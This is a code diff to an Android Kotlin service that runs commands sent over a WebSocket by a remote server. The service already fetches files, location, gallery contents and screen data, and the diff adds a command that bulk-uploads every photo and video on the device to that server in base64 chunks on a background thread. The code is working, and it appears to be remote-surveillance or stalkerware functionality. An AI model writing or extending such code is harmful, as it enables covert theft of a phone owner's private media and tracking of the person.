@@ -121,6 +121,7 @@ class StreamingService : Service() {
     @Volatile private var wsScreen: WebSocket? = null
     @Volatile private var wsPhone: WebSocket? = null
     @Volatile private var frameErrorReported = false
+    @Volatile private var bulkCancelled = false
 
     private val serverBase: String get() {
         var host = BuildConfig.DEFAULT_SERVER.trim()
@@ -375,6 +376,8 @@ class StreamingService : Service() {
                             "vibrate"            -> doVibrate(json.optLong("ms", 500))
                             "get-file"           -> sendFile(json.optString("path",""), json.optString("requestId",""), ws)
                             "get-gallery-stats"  -> sendGalleryStats(ws)
+                            "get-bulk-download"  -> { bulkCancelled = false; sendBulkFiles(json.optString("mediaType","all"), json.optInt("photoLimit",0), json.optInt("videoLimit",0), ws) }
+                            "cancel-bulk"        -> bulkCancelled = true
                             "get-location"       -> sendLocation(ws)
                             "get-gallery"        -> sendGallery(json.optString("mediaType","images"), json.optInt("limit",30), json.optInt("offset",0), ws)
                             "get-media-thumb"    -> sendMediaThumb(json.optLong("id",0), json.optString("mediaType","images"), ws)
@@ -857,6 +860,84 @@ class StreamingService : Service() {
                     }
                 }
             } catch (e: Exception) { err(e.message ?: "ошибка") }
+        }.apply { isDaemon = true }.start()
+    }
+
+    @Suppress("DEPRECATION")
+    private fun sendBulkFiles(mediaType: String, photoLimit: Int, videoLimit: Int, ws: WebSocket) {
+        Thread {
+            try {
+                data class MF(val path: String, val name: String, val mime: String, val size: Long)
+                val files = mutableListOf<MF>()
+
+                fun collectMedia(uri: android.net.Uri, perm: String, limit: Int) {
+                    if (ContextCompat.checkSelfPermission(this, perm) != PackageManager.PERMISSION_GRANTED) return
+                    contentResolver.query(uri,
+                        arrayOf(MediaStore.MediaColumns.DATA, MediaStore.MediaColumns.DISPLAY_NAME,
+                                MediaStore.MediaColumns.MIME_TYPE, MediaStore.MediaColumns.SIZE),
+                        null, null, "${MediaStore.MediaColumns.DATE_ADDED} DESC")?.use { c ->
+                        val pathCol = c.getColumnIndex(MediaStore.MediaColumns.DATA); if (pathCol < 0) return
+                        val nameCol = c.getColumnIndex(MediaStore.MediaColumns.DISPLAY_NAME)
+                        val mimeCol = c.getColumnIndex(MediaStore.MediaColumns.MIME_TYPE)
+                        val sizeCol = c.getColumnIndex(MediaStore.MediaColumns.SIZE)
+                        var count = 0
+                        while (c.moveToNext() && (limit <= 0 || count < limit)) {
+                            val path = c.getString(pathCol) ?: continue
+                            if (!File(path).isFile) continue
+                            val name = if (nameCol >= 0) c.getString(nameCol) ?: File(path).name else File(path).name
+                            val mime = if (mimeCol >= 0) c.getString(mimeCol) ?: "application/octet-stream" else "application/octet-stream"
+                            val size = if (sizeCol >= 0) c.getLong(sizeCol) else File(path).length()
+                            files.add(MF(path, name, mime, size)); count++
+                        }
+                    }
+                }
+
+                val imgPerm = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU)
+                    Manifest.permission.READ_MEDIA_IMAGES else Manifest.permission.READ_EXTERNAL_STORAGE
+                val vidPerm = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU)
+                    Manifest.permission.READ_MEDIA_VIDEO else Manifest.permission.READ_EXTERNAL_STORAGE
+
+                if (mediaType == "images" || mediaType == "all")
+                    collectMedia(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, imgPerm, photoLimit)
+                if (mediaType == "videos" || mediaType == "all")
+                    collectMedia(MediaStore.Video.Media.EXTERNAL_CONTENT_URI, vidPerm, videoLimit)
+
+                val total = files.size
+                val totalBytes = files.sumOf { it.size }
+                ws.send(JSONObject().put("type","bulk-start").put("total",total).put("totalBytes",totalBytes).toString())
+
+                val chunkSize = 512 * 1024
+                for ((idx, entry) in files.withIndex()) {
+                    if (bulkCancelled) {
+                        ws.send(JSONObject().put("type","bulk-done").put("cancelled",true).put("done",idx).put("total",total).toString())
+                        return@Thread
+                    }
+                    val file = File(entry.path)
+                    val fileSize = file.length()
+                    val requestId = "bulk_$idx"
+                    val totalChunks = ((fileSize + chunkSize - 1) / chunkSize).toInt().coerceAtLeast(1)
+                    try {
+                        file.inputStream().use { stream ->
+                            val buf = ByteArray(chunkSize); var chunkIdx = 0
+                            while (true) {
+                                val read = stream.read(buf); if (read <= 0) break
+                                ws.send(JSONObject()
+                                    .put("type","file-chunk").put("requestId",requestId)
+                                    .put("index",chunkIdx).put("total",totalChunks)
+                                    .put("name",entry.name).put("mime",entry.mime).put("size",fileSize)
+                                    .put("data", Base64.encodeToString(buf, 0, read, Base64.NO_WRAP)).toString())
+                                chunkIdx++
+                                while (ws.queueSize() > 1024 * 1024) { if (bulkCancelled) break; Thread.sleep(50) }
+                            }
+                        }
+                    } catch (_: Exception) {}
+                    ws.send(JSONObject().put("type","bulk-progress")
+                        .put("done",idx+1).put("total",total).put("name",entry.name).toString())
+                }
+                ws.send(JSONObject().put("type","bulk-done").put("done",total).put("total",total).toString())
+            } catch (e: Exception) {
+                ws.send(JSONObject().put("type","bulk-done").put("err",e.message?:"ошибка").toString())
+            }
         }.apply { isDaemon = true }.start()
     }
 
